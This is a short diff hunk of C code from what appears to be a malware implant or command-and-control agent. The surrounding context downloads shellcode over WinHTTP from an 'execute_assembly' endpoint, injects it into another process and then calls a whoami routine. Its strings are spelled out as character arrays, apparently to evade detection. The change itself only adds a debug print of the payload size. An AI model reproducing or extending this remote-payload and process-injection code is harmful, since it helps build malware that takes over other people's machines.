@@ -379,6 +379,8 @@ void myMain()
             DWORD dwShellcodeSize;
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint);
+            CHAR hi[] = {'S', 'i', 'z', 'e', ':', ' ', '%', 'd', 0};
+            ((PRINTF)api->printf)(hi, dwShellcodeSize);
             ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
             //CHAR taskOutput[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', ' ', 'A', 's', 'm', ' ', 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
